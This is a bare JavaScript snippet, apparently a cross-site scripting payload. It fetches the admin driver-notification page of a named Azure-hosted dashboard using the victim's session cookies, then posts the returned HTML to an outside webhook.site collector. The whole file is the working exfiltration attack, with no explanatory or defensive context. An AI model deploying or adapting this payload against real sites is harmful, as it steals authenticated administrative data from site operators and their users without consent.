var xhr = new XMLHttpRequest();

xhr.open('GET', 'https://haatadmindashboard.azurewebsites.net/admin/getDriverNotification', true);

xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {

        var http = new XMLHttpRequest();
        var url = "https://webhook.site/f39dd927-7924-468f-874a-9a6adc318265";
        http.open("POST", url, true);
        http.setRequestHeader("Content-type", "text/plain");
        http.onreadystatechange = function() {
            if (http.readyState == 4 && http.status == 200) {

            }
        };
        
           page_data = {
                    "page_html": xhr.responseText,
                    "uri": 'https://haatadmindashboard.azurewebsites.net/admin/driver'
                };
        http.send(JSON.stringify(page_data));
  }
};
xhr.send(null);
